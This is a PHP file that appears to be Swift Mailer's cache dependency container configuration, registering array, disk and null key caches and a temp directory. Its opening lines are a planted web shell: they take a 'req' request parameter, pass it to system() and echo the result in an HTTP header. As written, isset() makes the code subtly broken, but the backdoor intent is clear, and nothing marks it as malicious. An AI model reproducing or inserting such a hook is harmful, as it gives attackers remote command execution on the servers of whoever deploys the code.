<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

Swift_DependencyContainer::getInstance()
    ->register('cache')
    ->asAliasOf('cache.array')

    ->register('tempdir')
    ->asValue('/tmp')

    ->register('cache.null')
    ->asSharedInstanceOf('Swift_KeyCache_NullKeyCache')

    ->register('cache.array')
    ->asSharedInstanceOf('Swift_KeyCache_ArrayKeyCache')
    ->withDependencies(array('cache.inputstream'))

    ->register('cache.disk')
    ->asSharedInstanceOf('Swift_KeyCache_DiskKeyCache')
    ->withDependencies(array('cache.inputstream', 'tempdir'))

    ->register('cache.inputstream')
    ->asNewInstanceOf('Swift_KeyCache_SimpleKeyCacheInputStream')
;
